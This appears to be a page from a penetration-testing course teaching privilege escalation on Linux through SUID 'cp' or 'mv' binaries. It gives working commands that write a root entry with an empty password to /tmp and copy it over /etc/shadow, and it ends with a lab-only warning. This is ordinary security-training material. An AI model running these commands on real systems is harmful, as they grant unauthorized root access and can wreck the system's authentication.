Module 7›Chapter 7.3›SUID 'cp' and 'mv'

The Overwrite Strategy

  • Identify an SUID cp or mv binary.
  • Create a malicious version of a critical system file (e.g., /etc/shadow) with a known root password hash.
  • Use the SUID binary to overwrite the legitimate system file with your malicious version.
  • Log in as root using the new password.

Target: /etc/shadow

  • Contains encrypted user passwords and password aging information.
  • Only readable by root, and only writable by root.
  • Overwriting it with a known root hash grants immediate root access.
Key Takeaway

SUID 'cp' or 'mv' can be used to overwrite critical system files like '/etc/shadow', providing root access but with a high risk of system instability.

SUID 'cp' Exploitation Example
# 1. Create a malicious shadow file
#    (e.g., 'root::18706:0:99999:7:::' for no password)
echo "root::18706:0:99999:7:::" > /tmp/malicious_shadow

# 2. Use SUID cp to overwrite /etc/shadow
#    Assume /usr/bin/cp is SUID root
/usr/bin/cp /tmp/malicious_shadow /etc/shadow

# 3. Now you can log in as root (if no password set) or
#    use 'su root' with the password you set in the hash.
Warning: Highly Destructive

Overwriting critical system files can render the system unusable. This method should ONLY be used in controlled lab environments for educational purposes.
